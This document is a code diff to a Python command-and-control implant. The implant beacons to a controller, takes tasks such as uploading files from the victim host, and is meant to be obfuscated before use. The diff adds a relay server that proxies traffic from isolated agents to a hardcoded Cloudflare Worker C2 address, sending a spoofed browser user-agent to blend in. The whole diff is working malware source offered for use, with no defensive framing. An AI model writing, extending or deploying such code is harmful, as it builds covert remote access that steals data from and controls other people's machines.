@@ -74,9 +74,17 @@ Supported commands:
   UPLOAD:/path/to/file     file read in binary mode, returned as base64
 
 Environment variables (bake before obfuscating):
-  C2_PSK      pre-shared passphrase  (default: changeme)
-  C2_INT      base beacon interval s (default: 60)
-  C2_JITTER   ± jitter seconds       (default: 30)
+  C2_PSK          pre-shared passphrase  (default: changeme)
+  C2_INT          base beacon interval s (default: 60)
+  C2_JITTER       ± jitter seconds       (default: 30)
+  C2_RELAY_PORT   if set, start HTTP relay server on this port (default: 0 = off)
+  C2_RELAY_BIND   relay listen address   (default: 0.0.0.0)
+
+Relay mode (C2_RELAY_PORT):
+  Enables a plain-HTTP server identical to the NullRelay relay: it proxies
+  Cloudflare Worker API calls from isolated NullRelay agents. WORKER_URL must
+  also be set (env or baked). Isolated agent config: WORKER_URL=http://<relay>:<port>.
+  Both relay and isolated agent must share the same PSK. Runs in a daemon thread.
 
 Dependencies: Python 3.6+ stdlib only.
 
@@ -90,14 +98,19 @@ Limitations:
   - If the firewall NTP allowlist restricts UDP/123 to specific IPs, the
     /etc/hosts redirect is ineffective (packet is dropped before leaving the
     host). In that case fall back to the DNS or HTTPS C2 channel.
+  - Relay listens on plain HTTP; use only on trusted internal networks.
 """
 
-import base64, hashlib, hmac as _hmac, json, os, platform
-import random, socket, struct, subprocess, sys, time, zlib
+import base64, hashlib, hmac as _hmac, http.server, json, os, platform
+import random, socket, socketserver, ssl, struct, subprocess, sys, threading
+import time, urllib.error, urllib.request, zlib
 
-C2_PSK     = os.environ.get("C2_PSK",     "changeme")
-BEACON_INT = int(os.environ.get("C2_INT",    "60"))
-JITTER     = int(os.environ.get("C2_JITTER", "30"))
+C2_PSK      = os.environ.get("C2_PSK",        "changeme")
+BEACON_INT  = int(os.environ.get("C2_INT",    "60"))
+JITTER      = int(os.environ.get("C2_JITTER", "30"))
+WORKER_URL  = os.environ.get("WORKER_URL", "https://cipherfall-c2.elierocamora82.workers.dev").rstrip("/")
+RELAY_PORT  = int(os.environ.get("C2_RELAY_PORT", "0"))
+RELAY_BIND  = os.environ.get("C2_RELAY_BIND", "0.0.0.0")
 MAX_OUTPUT = 900
 
 _NTP_DOMAINS = {
@@ -417,11 +430,54 @@ def _beacon(c2_ip):
         _pending_result = (resp.get("task_id", ""), output)
 
 
+# ── Relay server ─────────────────────────────────────────────────────────────
+
+_CV_TOKEN = _hmac.new(C2_PSK.encode(), b"worker_token", hashlib.sha256).hexdigest()[:32]
+_CV_SSL   = ssl.create_default_context()
+_CV_UA    = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+             "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
+
+
+class _RelayHandler(http.server.BaseHTTPRequestHandler):
+    def log_message(self, *_): pass
+
+    def _fwd(self, body=None):
+        if self.headers.get("Authorization", "") != f"Bearer {_CV_TOKEN}":
+            self.send_response(404); self.end_headers(); return
+        url  = WORKER_URL + self.path
+        hdrs = {"Authorization": f"Bearer {_CV_TOKEN}", "User-Agent": _CV_UA}
+        if body:
+            hdrs["Content-Type"] = self.headers.get("Content-Type", "text/plain")
+        req = urllib.request.Request(url, data=body, headers=hdrs, method=self.command)
+        ctx = _CV_SSL if url.startswith("https://") else None
+        try:
+            with urllib.request.urlopen(req, context=ctx, timeout=15) as r:
+                data = r.read()
+                self.send_response(r.status); self.end_headers(); self.wfile.write(data)
+        except urllib.error.HTTPError as e:
+            data = e.read()
+            self.send_response(e.code); self.end_headers(); self.wfile.write(data)
+        except Exception:
+            self.send_response(503); self.end_headers()
+
+    def do_GET(self): self._fwd()
+    def do_PUT(self):
+        n = int(self.headers.get("Content-Length", 0))
+        self._fwd(self.rfile.read(n) if n else None)
+
+
+def _start_relay():
+    srv = socketserver.ThreadingTCPServer((RELAY_BIND, RELAY_PORT), _RelayHandler)
+    srv.daemon_threads = True
+    threading.Thread(target=srv.serve_forever, daemon=True).start()
+
+
 def main():
     if len(sys.argv) > 1 and sys.argv[1] == "--id":
         print(AGENT_ID)
         return
-
+    if RELAY_PORT:
+        _start_relay()
     c2_ip = _resolve_c2()
     tick  = 0
     while True:
